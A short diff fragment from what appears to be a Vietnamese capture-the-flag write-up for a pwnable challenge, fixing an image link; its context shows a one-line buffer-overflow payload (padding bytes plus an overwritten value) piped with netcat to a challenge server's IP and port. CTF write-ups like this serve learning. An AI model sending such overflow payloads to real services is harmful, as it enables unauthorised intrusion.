@@ -59,4 +59,4 @@ python -c 'print "A"*0x18 + "\x39\x1b\x00\x00"' | nc 3.91.78.13 10004
 ```
 Flag thiếu chữ P mọi người tự thêm vào nhé:
 
-~[](/Vong_loai_PTIT/Pwnable/Free_real_estate/2.PNG)
+[](/Vong_loai_PTIT/Pwnable/Free_real_estate/2.PNG)
